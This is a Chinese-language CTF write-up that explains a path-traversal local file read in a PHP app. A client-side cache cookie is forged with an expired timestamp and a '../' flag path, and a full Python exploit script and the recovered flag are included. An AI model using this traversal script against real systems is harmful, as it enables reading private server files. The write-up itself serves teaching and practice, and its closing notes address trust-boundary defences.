# CakeCTF2021 MofuMofu Diary

## 题目简述

应用把图片列表和缓存过期时间放在客户端可修改的 `cache` Cookie 中。缓存过期时，服务器遍历 Cookie 提供的文件名，调用 `file_get_contents`，再把内容 Base64 编码进 PHP Session。由于文件名没有做路径约束，这形成了本地文件读取。

## 解题过程

### 获取合法缓存结构和会话

第一次访问时，服务器设置 PHP Session，并返回类似结构的 JSON Cookie：

```json
{
  "data": [
    {"name": "images/example.jpg", "description": "..."}
  ],
  "expiry": 1630000000
}
```

后续利用必须同时保留 `PHPSESSID`。服务器把读取结果保存为 `$_SESSION[$result['name']]`，同一次渲染又从这个 Session 键取出 `<img src>`。

### 伪造过期缓存并指定 flag 路径

把 `expiry` 改成过去时间，只保留一个数据项，并把 `name` 改为足够多层的 `../../../../../../../../flag.txt`。服务器进入刷新分支后执行：

```php
$_SESSION[$result['name']] =
    'data:jpg;base64,' . base64_encode(file_get_contents($result['name']));
```

完整请求逻辑可以写成：

```python
import base64
import json
import re
import requests
from urllib.parse import quote, unquote

s = requests.Session()
r = s.get("http://target/")
cache = json.loads(unquote(r.cookies["cache"]))
cache["expiry"] = 0
cache["data"] = [{
    "name": "../../../../../../../../flag.txt",
    "description": "flag"
}]

r = s.get("http://target/", cookies={"cache": quote(json.dumps(cache))})
encoded = re.search(r"data:jpg;base64,([^\"]+)", r.text).group(1)
print(base64.b64decode(encoded).decode())
```

虽然数据 URI 被标成 `jpg`，其中实际是任意文件原文。解码得到：

```text
CakeCTF{4n1m4ls_4r3_h0n3st_unl1k3_hum4ns_6e081a}
```

仓库中的动物照片只用于页面展示，不影响 Cookie 信任边界或文件读取过程，因此无需在 WP 中保留。

## 方法总结

- 客户端缓存只能作为提示，服务器不能信任其中的本地路径、对象类型或过期状态。
- 利用链需要同时控制 `cache` Cookie 并保持原 PHP Session，否则写入和渲染的 Session 数据无法对应。
- `data:image/...;base64,` 只是浏览器展示包装，解码后可以是文本等任意文件内容。
